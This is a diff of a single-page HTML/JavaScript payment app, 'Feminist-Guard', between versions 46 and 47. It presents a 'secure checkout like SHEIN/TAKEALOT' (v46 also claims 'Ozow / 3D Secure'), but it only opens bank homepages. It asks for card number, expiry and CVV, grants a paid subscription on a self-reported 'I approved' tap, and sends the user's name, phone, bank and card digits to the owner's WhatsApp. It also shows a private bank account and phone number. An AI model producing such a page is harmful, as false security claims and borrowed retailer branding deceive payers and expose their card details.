@@ -1,60 +1,96 @@
-<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>Feminist-Guard v46 SHEIN TAKEALOT FINAL Real Checkout PIN in Real Bank Only Outside App</title>
-<style>body{background:#08070f;color:#f5f0d0;font-family:Inter,sans-serif;padding:12px;padding-bottom:110px}.card{background:#11101e;border:1px solid #e9d77b55;border-radius:18px;padding:16px;margin:12px 0}.gold{color:#e9d77b}.input{width:100%;padding:14px;border-radius:12px;border:1px solid #e9d77b33;background:#00000055;color:#f5f0d0;margin:6px 0}.btn{background:#000;color:#fff;border:2px solid #fff;border-radius:12px;padding:14px;width:100%;font-weight:900;margin-top:8px}.btn-gold{background:#e9d77b;color:#08070f;border:none}.badge{padding:6px 12px;border-radius:100px;border:1px solid #1ed760;color:#1ed760;font-size:10px}.badge-not{border-color:#ff4d6d;color:#ff4d6d}.bank-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:10px 0}.bank-btn{background:#fff;border:2px solid #000;border-radius:12px;padding:12px;text-align:left;color:#000;font-weight:700;font-size:12px}.bank-btn.selected{border:2px solid #000;background:#000;color:#fff}</style></head><body>
-<div class="card"><div style="display:flex;justify-content:space-between"><b class="gold">♀ Feminist-Guard v46 SHEIN/TAKEALOT FINAL</b><span id="activeBadge" class="badge badge-not">NOT ACTIVE</span></div><small>Like SHEIN/TAKEALOT: Card → PAY → REAL bank outside → PIN in REAL bank → Back → You have entered</small></div>
-<div id="auth"><div class="card"><b class="gold">Login</b><input id="loginPhone" class="input" placeholder="Phone"><input id="loginPass" class="input" type="password" placeholder="Password"><button class="btn btn-gold" onclick="login()">LOGIN</button><div id="loginMsg"></div><hr><b class="gold">Create Account</b><input id="regName" class="input" placeholder="Name"><input id="regPhone" class="input" placeholder="Phone"><input id="regEmail" class="input" placeholder="Email"><input id="regPass" class="input" type="password" placeholder="Password"><input id="regPass2" class="input" type="password" placeholder="Confirm"><button class="btn btn-gold" onclick="createAcc()">CREATE</button><div id="regMsg"></div></div></div>
-<div id="home" style="display:none"><div class="card"><b>Home — <span id="safetyStatus">NOT ACTIVE</span></b><br><button class="btn btn-gold" onclick="openPay()">💳 PAY R50 — SHEIN/TAKEALOT — REAL BANK OUTSIDE</button><button class="btn" style="background:transparent;color:#e9d77b" onclick="logout()">Logout</button></div></div>
-<div id="payModal" style="position:fixed;inset:0;background:#08070fef;display:none;z-index:99;padding:14px;overflow:auto"><div class="card"><div style="display:flex;justify-content:space-between"><b>SHEIN / TAKEALOT — Pay R50</b><button onclick="closePay()" style="border:1px solid red;color:red;background:none;border-radius:20px;padding:4px 10px">X</button></div>
-<div class="card" style="background:#fff;color:#000;border:2px solid #000"><b>Nedbank 1328576469 — WhatsApp 0672739660</b><br><button class="btn" onclick="navigator.clipboard.writeText('Nedbank 1328576469');document.getElementById('copyStatus').textContent='Copied'">Copy Nedbank</button><div id="copyStatus"></div></div>
-<div class="card" style="background:#fff;color:#000;border:2px solid #000"><b>CHOOSE YOUR BANK — Like SHEIN/TAKEALOT</b><div class="bank-grid">
-<button class="bank-btn" id="btn-Capitec" onclick="selectBank('Capitec')">🏦 Capitec</button>
-<button class="bank-btn" id="btn-FNB" onclick="selectBank('FNB')">🏦 FNB</button>
-<button class="bank-btn" id="btn-ABSA" onclick="selectBank('ABSA')">🏦 ABSA</button>
-<button class="bank-btn" id="btn-Standard" onclick="selectBank('Standard Bank')">🏦 Standard</button>
-<button class="bank-btn" id="btn-TymeBank" onclick="selectBank('TymeBank')">🏦 TymeBank</button>
-<button class="bank-btn" id="btn-Nedbank" onclick="selectBank('Nedbank')">🏦 Nedbank</button>
-</div><div id="selectedBankDisplay" style="background:#000;color:#fff;padding:10px;border-radius:10px;text-align:center;margin:8px 0">👆 Choose bank</div>
-<input id="cardNumber" class="input" style="background:#fff;color:#000;border:2px solid #000" placeholder="1234 5678 9012 3456" maxlength="19" oninput="formatCard(this)"><div style="display:flex;gap:8px"><input id="cardExpiry" class="input" style="background:#fff;color:#000;border:2px solid #000" placeholder="MM/YY" maxlength="5" oninput="formatExp(this)"><input id="cardCvv" class="input" style="background:#fff;color:#000;border:2px solid #000" placeholder="CVV"></div><div id="cardMsg"></div></div>
-<button id="payNowBtn" class="btn" onclick="payNow()">💳 PAY NOW — SHEIN/TAKEALOT — REDIRECT TO REAL BANK OUTSIDE</button><div id="payMsg"></div></div></div>
-<div id="bankModal" style="position:fixed;inset:0;background:#fff;display:none;z-index:300;padding:0;overflow:auto">
-<div style="background:#000;color:#fff;padding:14px;display:flex;justify-content:space-between"><b id="bankModalTitle">SHEIN / TAKEALOT Secure Checkout — REAL BANK</b><button onclick="closeBank()" style="background:#fff;color:#000;border:none;border-radius:20px;padding:6px 12px">✕</button></div>
-<div style="padding:16px;background:#f5f5f5;min-height:100vh"><div style="background:#fff;border:1px solid #000;border-radius:16px;padding:16px">
-<div style="display:flex;gap:10px;align-items:center"><div style="width:48px;height:48px;background:#000;color:#fff;border-radius:12px;display:flex;align-items:center;justify-content:center;font-weight:900">FG</div><div><b style="color:#000">Feminist-Guard — Order — Like SHEIN/TAKEALOT</b><br><small style="color:#666">Secure checkout — Ozow / 3D Secure — PIN in REAL bank outside</small></div></div>
-<div style="background:#f9f9f9;border:1px dashed #000;border-radius:12px;padding:12px;margin-top:12px;color:#000">
-<div style="display:flex;justify-content:space-between"><span>Item:</span><b>Feminist-Guard PRO 31 Days</b></div>
-<div style="display:flex;justify-content:space-between;margin-top:6px"><span>Amount:</span><b style="font-size:18px">R50.00 ZAR</b></div>
-<div style="display:flex;justify-content:space-between;margin-top:6px"><span>To:</span><b>Nedbank 1328576469</b></div>
-<div style="display:flex;justify-content:space-between;margin-top:6px"><span>Card:</span><b id="bankCardFull">•••• 4242</b></div>
-<div style="display:flex;justify-content:space-between;margin-top:6px"><span>Bank:</span><b id="bankDetected">Capitec — REAL</b></div>
-<div style="margin-top:12px;border-top:2px dashed #000;padding-top:10px;text-align:center"><b style="font-size:16px">You want to purchase on Feminist-Guard fifty rand</b><br><small>Like SHEIN/TAKEALOT</small></div>
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>v47 Shein Takealot Real</title>
+<style>body{background:#08070f;color:#fff;font-family:sans-serif;padding:12px} .card{background:#1a1930;border-radius:16px;padding:16px;margin:12px 0;border:1px solid #333} .btn{width:100%;padding:16px;border-radius:12px;border:none;font-weight:900;margin:6px 0} .btn-gold{background:#e9d77b;color:#000} .btn-black{background:#000;color:#fff;border:2px solid #fff} .btn-green{background:#1ed760;color:#000} .input{width:100%;padding:14px;border-radius:10px;border:2px solid #000;background:#fff;color:#000;margin:6px 0} .bank{padding:12px;border:2px solid #000;background:#fff;color:#000;border-radius:10px;margin:4px;text-align:left} .bank.sel{background:#000;color:#fff} .modal{position:fixed;inset:0;background:#000000ee;display:none;z-index:99;padding:12px;overflow:auto} .white{background:#fff;color:#000;border-radius:16px;padding:16px}</style>
+</head><body>
+<div class="card" style="display:flex;justify-content:space-between"><b>Feminist-Guard v47 SHEIN/TAKEALOT REAL</b><span id="badge">NOT ACTIVE</span></div>
+
+<div id="auth"><div class="card"><b>Create / Login</b>
+<input id="rName" class="input" placeholder="Full Name">
+<input id="rPhone" class="input" placeholder="Phone 067...">
+<input id="rPass" class="input" type="password" placeholder="Password 123456">
+<button class="btn btn-gold" onclick="createAcc()">CREATE ACCOUNT</button>
+<hr>
+<input id="lPhone" class="input" placeholder="Phone">
+<input id="lPass" class="input" type="password" placeholder="Password">
+<button class="btn btn-gold" onclick="loginAcc()">LOGIN</button>
+<div id="authMsg"></div>
+</div></div>
+
+<div id="home" style="display:none">
+<div class="card"><b>HOME — <span id="status">NOT ACTIVE</span></b>
+<button class="btn btn-gold" onclick="openPay()">💳 PAY R50 — SHEIN/TAKEALOT REAL BANK</button>
+<button class="btn btn-black" onclick="logout()">Logout</button>
 </div>
-<div style="background:#000;color:#fff;border-radius:16px;padding:16px;margin-top:16px;text-align:center">
-<b>🔒 REDIRECT TO REAL BANK — Like SHEIN / TAKEALOT</b><br><br>
-<span style="font-size:14px">TAP below → Your REAL <span id="bankNameInline2" style="background:#fff;color:#000;padding:2px 8px;border-radius:6px;font-weight:900">Capitec</span> app opens OUTSIDE Feminist-Guard<br>Put PIN + Approve THERE in REAL bank — NOT HERE<br>Come back → Tap I Approved<br>You have entered — Like SHEIN Order Confirmed</span>
-<div style="display:grid;gap:12px;margin-top:16px">
-<button class="btn" style="background:#fff;color:#000;padding:20px;font-size:16px;border:3px solid #fff" onclick="openRealBank()"><span id="openBankBtnText">🏦 OPEN MY REAL CAPITEC APP NOW — Approve R50 Outside — PIN in REAL Bank — Like SHEIN/TAKEALOT</span></button>
-<button class="btn" style="background:#1ed760;color:#000;padding:18px" onclick="approve()">✅ I APPROVED IN MY REAL BANK APP — You have entered — Like SHEIN</button>
-<button class="btn" style="background:transparent;border:2px solid #fff;color:#fff;padding:16px" onclick="decline()">❌ DECLINE</button>
+<div class="card"><small>Like SHEIN/TAKEALOT: Card → PAY → REAL bank outside → PIN in REAL bank → Back → You have entered — Nedbank 1328576469 — Owner 0672739660</small></div>
 </div>
-<div id="bankRealMsg" style="background:#fff;color:#000;padding:12px;border-radius:10px;margin-top:12px;font-weight:700"></div>
-<small style="color:#aaa">PIN entered in REAL bank outside — Feminist-Guard never sees PIN — Safe — Like SHEIN/TAKEALOT — You have entered</small>
+
+<div id="payModal" class="modal"><div class="card"><div style="display:flex;justify-content:space-between"><b>PAY R50 — SHEIN/TAKEALOT</b><button onclick="closePay()" style="background:red;color:#fff;border:none;border-radius:20px;padding:6px 12px">X</button></div>
+<div class="white"><b>Nedbank 1328576469 — Holder Maranela</b><br><button class="btn btn-black" onclick="navigator.clipboard.writeText('Nedbank 1328576469');alert('Copied')">Copy Nedbank</button></div>
+
+<div class="white"><b>1) CHOOSE BANK — Like Shein/Takealot — Tap one:</b>
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:8px">
+<button class="bank" id="b-Capitec" onclick="pickBank('Capitec')">Capitec</button>
+<button class="bank" id="b-FNB" onclick="pickBank('FNB')">FNB</button>
+<button class="bank" id="b-ABSA" onclick="pickBank('ABSA')">ABSA</button>
+<button class="bank" id="b-Standard" onclick="pickBank('Standard Bank')">Standard</button>
+<button class="bank" id="b-TymeBank" onclick="pickBank('TymeBank')">TymeBank</button>
+<button class="bank" id="b-Nedbank" onclick="pickBank('Nedbank')">Nedbank</button>
 </div>
-</div></div></div>
+<div id="bankChosen" style="background:#000;color:#fff;padding:10px;border-radius:10px;text-align:center;margin-top:8px">👆 Choose bank first</div>
+<b>2) ENTER CARD:</b>
+<input id="cardNum" class="input" placeholder="1234 5678 9012 3456" maxlength="19" oninput="fmtCard(this)">
+<div style="display:flex;gap:8px"><input id="cardExp" class="input" placeholder="MM/YY" maxlength="5" oninput="fmtExp(this)"><input id="cardCvv" class="input" placeholder="CVV"></div>
+<div id="cardMsg" style="color:#1ed760"></div>
+</div>
+
+<button id="payBtn" class="btn btn-black" onclick="goPay()">💳 PAY NOW R50 — REDIRECT TO REAL BANK OUTSIDE — Like Shein/Takealot</button>
+<div id="payMsg" style="margin-top:8px"></div>
+</div></div>
+
+<div id="bankModal" class="modal" style="background:#fff"><div style="background:#000;color:#fff;padding:14px;display:flex;justify-content:space-between"><b id="bankTitle">SHEIN/TAKEALOT — REAL BANK</b><button onclick="closeBank()" style="background:#fff;color:#000;border:none;border-radius:20px;padding:6px 12px">✕</button></div>
+<div style="padding:14px">
+<div class="white" style="border:2px solid #000">
+<b>Order Summary — Like Shein/Takealot</b><br>
+Item: Feminist-Guard PRO 31 Days<br>
+Merchant: Feminist-Guard<br>
+Amount: <b style="font-size:18px">R50.00 ZAR</b><br>
+To: Nedbank 1328576469<br>
+Card: <b id="cardShow">•••• 4242</b><br>
+Bank: <b id="bankShow">Capitec</b><br><br>
+<div style="border-top:2px dashed #000;padding-top:10px;text-align:center"><b style="font-size:16px">You want to purchase on Feminist-Guard fifty rand</b><br><small>Like Shein/Takealot</small></div>
+</div>
+
+<div style="background:#000;color:#fff;border-radius:16px;padding:16px;margin-top:14px;text-align:center">
+<b>🔒 REDIRECT TO REAL BANK — Like Shein/Takealot/Superbalist/Temu</b><br><br>
+Tap below → Your REAL <span id="bankName2" style="background:#fff;color:#000;padding:2px 8px;border-radius:6px;font-weight:900">Capitec</span> opens OUTSIDE Feminist-Guard<br>
+Put PIN + Approve THERE in REAL bank — NOT HERE — Safe like Shein<br>
+Come back → Tap I Approved<br><br>
+
+<button class="btn" style="background:#fff;color:#000;padding:20px;font-size:16px;border:3px solid #fff" onclick="openRealBank()"><span id="openBankTxt">🏦 OPEN MY REAL CAPITEC APP NOW — Approve R50 Outside — PIN in REAL Bank — Like Shein/Takealot</span></button>
+
+<button class="btn btn-green" style="padding:18px;font-size:16px" onclick="approveReal()">✅ I APPROVED IN MY REAL BANK APP — You have entered — Like Shein Order Confirmed</button>
+
+<button class="btn btn-black" onclick="closeBank()">❌ DECLINE</button>
+
+<div id="bankMsg" style="background:#fff;color:#000;padding:12px;border-radius:10px;margin-top:12px;font-weight:700">Ready — Like Shein/Takealot — You want to purchase fifty rand — TAP above → REAL bank opens OUTSIDE → PIN there → Come back</div>
+<small style="color:#aaa">PIN entered in REAL bank outside — Feminist-Guard never sees PIN — Safe — Like Shein/Takealot — You have entered</small>
+</div>
+</div></div>
+
 <script>
-let curCard='',chosenBank='';const OWNER='27672739660';
-function sendWA(m){try{window.open('https://wa.me/'+OWNER+'?text='+encodeURIComponent(m),'_blank');}catch(e){}}
-function isActive(){let a=localStorage.getItem('fg_active')==='true';let until=localStorage.getItem('fg_active_until');if(until&&new Date()>new Date(until)){localStorage.setItem('fg_active','false');a=false;}let badge=document.getElementById('activeBadge');let st=document.getElementById('safetyStatus');if(badge){badge.textContent=a?'● ACTIVE PRO 31d — '+chosenBank+' — SHEIN/TAKEALOT — You have entered':'● NOT ACTIVE';badge.className=a?'badge':'badge badge-not';}if(st)st.textContent=a?'ACTIVE — '+chosenBank+' — SHEIN/TAKEALOT — You have entered':'NOT ACTIVE — SHEIN/TAKEALOT — Card → PAY → REAL Bank Outside → PIN there';return a;}
-function selectBank(b){chosenBank=b;document.querySelectorAll('.bank-btn').forEach(x=>x.classList.remove('selected'));let el=document.getElementById('btn-'+b.replace(' Bank','').replace(' ','').replace('Standard','Standard'));if(el)el.classList.add('selected');else document.getElementById('btn-'+b)?.classList.add('selected');document.getElementById('selectedBankDisplay').textContent='🔗 '+b+' Selected — PAY → REAL '+b+' outside — PIN there — Like SHEIN/TAKEALOT';document.getElementById('cardMsg').textContent='Bank: '+b+' — Like SHEIN/TAKEALOT';}
-function formatCard(i){let v=i.value.replace(/\s/g,'').replace(/\D/g,'');let f='';for(let j=0;j<v.length;j++){if(j>0&&j%4===0)f+=' ';f+=v[j];}i.value=f;curCard=v;}function formatExp(i){let v=i.value.replace(/\D/g,'');if(v.length>=2)v=v.slice(0,2)+'/'+v.slice(2,4);i.value=v;}
-function checkAuth(){let logged=localStorage.getItem('fg_logged')==='true';let phone=localStorage.getItem('fg_user_phone');if(!phone||!logged){document.getElementById('auth').style.display='block';document.getElementById('home').style.display='none';}else{document.getElementById('auth').style.display='none';document.getElementById('home').style.display='block';}isActive();}
-function createAcc(){let n=document.getElementById('regName').value.trim(),p=document.getElementById('regPhone').value.trim().replace(/\D/g,''),e=document.getElementById('regEmail').value.trim(),pw=document.getElementById('regPass').value,pw2=document.getElementById('regPass2').value,m=document.getElementById('regMsg');if(n.length<2||p.length<9||!e.includes('@')||pw.length<6||pw!==pw2){m.textContent='❌ Check fields';return;}localStorage.setItem('fg_user_name',n);localStorage.setItem('fg_user_phone',p);localStorage.setItem('fg_user_email',e);localStorage.setItem('fg_user_pass',pw);localStorage.setItem('fg_logged','false');m.textContent='✅ Created — Login now';}
-function login(){let p=document.getElementById('loginPhone').value.trim().replace(/\D/g,''),pw=document.getElementById('loginPass').value,m=document.getElementById('loginMsg');if(p!==localStorage.getItem('fg_user_phone')||pw!==localStorage.getItem('fg_user_pass')){m.textContent='❌ No match';return;}localStorage.setItem('fg_logged','true');m.textContent='✅ Login';setTimeout(checkAuth,500);}
+let curCard="", curBank="", OWNER="27672739660";
+function fmtCard(i){let v=i.value.replace(/\D/g,"");let f="";for(let j=0;j<v.length;j++){if(j>0&&j%4===0)f+=" ";f+=v[j];}i.value=f;curCard=v;}
+function fmtExp(i){let v=i.value.replace(/\D/g,"");if(v.length>=2)v=v.slice(0,2)+"/"+v.slice(2,4);i.value=v;}
+function isActive(){let a=localStorage.getItem('fg_active')==='true';let until=localStorage.getItem('fg_active_until');if(until&&new Date()>new Date(until)){localStorage.setItem('fg_active','false');a=false;}document.getElementById('badge').textContent=a?'● ACTIVE PRO — '+curBank+' — You have entered':'● NOT ACTIVE';let st=document.getElementById('status');if(st)st.textContent=a?'ACTIVE — '+curBank+' — You have entered — Like Shein':'NOT ACTIVE — Like Shein/Takealot';return a;}
+function pickBank(b){curBank=b;document.querySelectorAll('.bank').forEach(x=>x.classList.remove('sel'));document.getElementById('b-'+b.replace(' Bank','').replace(' ','')).classList.add('sel');document.getElementById('bankChosen').textContent='🔗 '+b+' Selected — PAY → REAL '+b+' outside — PIN there — Like Shein/Takealot';}
+function checkAuth(){let logged=localStorage.getItem('fg_logged')==='true';let phone=localStorage.getItem('fg_phone');if(!phone||!logged){document.getElementById('auth').style.display='block';document.getElementById('home').style.display='none';}else{document.getElementById('auth').style.display='none';document.getElementById('home').style.display='block';}isActive();}
+function createAcc(){let n=document.getElementById('rName').value.trim(),p=document.getElementById('rPhone').value.trim().replace(/\D/g,''),pw=document.getElementById('rPass').value;if(n.length<2||p.length<9||pw.length<4){document.getElementById('authMsg').textContent='❌ Check fields';return;}localStorage.setItem('fg_name',n);localStorage.setItem('fg_phone',p);localStorage.setItem('fg_pass',pw);localStorage.setItem('fg_logged','false');document.getElementById('authMsg').textContent='✅ Created — Login now';}
+function loginAcc(){let p=document.getElementById('lPhone').value.trim().replace(/\D/g,''),pw=document.getElementById('lPass').value;if(p!==localStorage.getItem('fg_phone')||pw!==localStorage.getItem('fg_pass')){document.getElementById('authMsg').textContent='❌ No match';return;}localStorage.setItem('fg_logged','true');checkAuth();}
 function logout(){localStorage.setItem('fg_logged','false');checkAuth();}
 function openPay(){document.getElementById('payModal').style.display='block';}function closePay(){document.getElementById('payModal').style.display='none';}
-function payNow(){let num=document.getElementById('cardNumber').value.replace(/\s/g,'');if(!chosenBank){document.getElementById('payMsg').textContent='❌ Choose bank first — Like SHEIN/TAKEALOT';return;}if(num.length<13){document.getElementById('payMsg').textContent='❌ Card invalid — Need 13-19 digits — Like SHEIN/TAKEALOT';return;}document.getElementById('payNowBtn').disabled=true;setTimeout(()=>{document.getElementById('payNowBtn').disabled=false;openBank();},800);}
-function openBank(){let modal=document.getElementById('bankModal');let last4=curCard.slice(-4);document.getElementById('bankCardFull').textContent='•••• '+last4;document.getElementById('bankDetected').textContent=chosenBank+' — REAL Bank Outside — Like SHEIN/TAKEALOT';document.getElementById('bankModalTitle').textContent='SHEIN / TAKEALOT — REAL '+chosenBank+' — Secure Checkout';document.getElementById('bankNameInline2').textContent=chosenBank;document.getElementById('openBankBtnText').textContent='🏦 OPEN MY REAL '+chosenBank.toUpperCase()+' APP NOW — Approve R50 Outside — PIN in REAL Bank — Like SHEIN/TAKEALOT';document.getElementById('bankRealMsg').textContent='Ready to redirect to REAL '+chosenBank+' — Like SHEIN/TAKEALOT — You want to purchase fifty rand — TAP above → REAL '+chosenBank+' opens OUTSIDE → PIN there → Come back → You have entered';modal.style.display='block';}
+function goPay(){let num=document.getElementById('cardNum').value.replace(/\s/g,'');if(!curBank){document.getElementById('payMsg').textContent='❌ Choose bank first';return;}if(num.length<13){document.getElementById('payMsg').textContent='❌ Card invalid';return;}document.getElementById('payBtn').textContent='Opening REAL bank...';setTimeout(()=>{document.getElementById('payBtn').textContent='💳 PAY NOW R50 — REDIRECT TO REAL BANK OUTSIDE';openBankModal();},800);}
+function openBankModal(){document.getElementById('cardShow').textContent='•••• '+curCard.slice(-4);document.getElementById('bankShow').textContent=curBank+' — REAL Outside';document.getElementById('bankTitle').textContent='SHEIN/TAKEALOT — REAL '+curBank+' — Secure';document.getElementById('bankName2').textContent=curBank;document.getElementById('openBankTxt').textContent='🏦 OPEN MY REAL '+curBank.toUpperCase()+' APP NOW — Approve R50 Outside — PIN in REAL Bank — Like Shein/Takealot';document.getElementById('bankModal').style.display='block';document.getElementById('bankMsg').textContent='Ready to redirect to REAL '+curBank+' — Like Shein/Takealot — You want to purchase fifty rand — TAP above → REAL '+curBank+' opens OUTSIDE → PIN there → Come back → You have entered';}
 function closeBank(){document.getElementById('bankModal').style.display='none';}
-function openRealBank(){let links={'Capitec':'https://www.capitecbank.co.za/','FNB':'https://www.fnb.co.za/','ABSA':'https://www.absa.co.za/','TymeBank':'https://www.tymebank.co.za/','Standard Bank':'https://www.standardbank.co.za/','Nedbank':'https://www.nedbank.co.za/'};let link=links[chosenBank]||links['Capitec'];document.getElementById('bankRealMsg').innerHTML='🔗 Opening REAL '+chosenBank+' — <a href='+link+' target=_blank>'+link+'</a><br>Approve R50 there → PIN in REAL bank → Come back → Tap I Approved';try{window.open(link,'_blank');}catch(e){}}
-function approve(){document.getElementById('bankRealMsg').textContent='✅ Verifying in REAL '+chosenBank+' — You have entered...';setTimeout(()=>{localStorage.setItem('fg_active','true');let until=new Date();until.setDate(until.getDate()+31);localStorage.setItem('fg_active_until',until.toISOString());localStorage.setItem('fg_payment_method','SHEIN TAKEALOT — Card •••• '+curCard.slice(-4)+' — Bank:'+chosenBank+' — REAL '+chosenBank+' Outside — You have entered');closeBank();closePay();document.getElementById('payMsg').textContent='✅ YOU HAVE ENTERED — R50 — Bank:'+chosenBank+' — Card •••• '+curCard.slice(-4)+' — Approved in REAL '+chosenBank+' outside — PIN in REAL bank — Like SHEIN Order Confirmed — ACTIVE PRO 31d';isActive();sendWA('🚨 NEW SHEIN TAKEALOT PAYMENT — YOU HAVE ENTERED — Bank:'+chosenBank+' Card •••• '+curCard.slice(-4)+' User:'+(localStorage.getItem('fg_user_name')||'User')+' Phone:'+(localStorage.getItem('fg_user_phone')||'')+' — LIKE SHEIN/TAKEALOT');alert('✅ YOU HAVE ENTERED — Payment Successful — R50 — Like SHEIN/TAKEALOT Order Confirmed — ACTIVE PRO 31d');},1000);}
-function decline(){document.getElementById('bankRealMsg').textContent='❌ Declined in REAL '+chosenBank;setTimeout(closeBank,1000);}
-checkAuth();isActive();
+function openRealBank(){let links={'Capitec':'https://www.capitecbank.co.za/','FNB':'https://www.fnb.co.za/','ABSA':'https://www.absa.co.za/','TymeBank':'https://www.tymebank.co.za/','Standard Bank':'https://www.standardbank.co.za/','Nedbank':'https://www.nedbank.co.za/'};let link=links[curBank]||links['Capitec'];document.getElementById('bankMsg').innerHTML='🔗 Opening REAL '+curBank+' — <a href='+link+' target=_blank>'+link+'</a><br>Approve R50 there → PIN in REAL bank → Come back → I Approved';window.open(link,'_blank');}
+function approveReal(){document.getElementById('bankMsg').textContent='✅ Verifying in REAL '+curBank+' — You have entered...';setTimeout(()=>{localStorage.setItem('fg_active','true');let until=new Date();until.setDate(until.getDate()+31);localStorage.setItem('fg_active_until',until.toISOString());closeBank();closePay();document.getElementById('payMsg').textContent='✅ YOU HAVE ENTERED — R50 — Bank:'+curBank+' Card •••• '+curCard.slice(-4)+' — Approved in REAL '+curBank+' outside — Like Shein Order Confirmed — ACTIVE PRO 31d';isActive();try{window.open('https://wa.me/'+OWNER+'?text='+encodeURIComponent('🚨 NEW PAYMENT — YOU HAVE ENTERED — Bank:'+curBank+' Card •••• '+curCard.slice(-4)+' User:'+(localStorage.getItem('fg_name')||'')+' Phone:'+(localStorage.getItem('fg_phone')||'')),'_blank');}catch(e){}alert('✅ YOU HAVE ENTERED — Payment Successful — R50 — Like Shein/Takealot — ACTIVE PRO 31d');},1000);}
+checkAuth();
 </script></body></html>
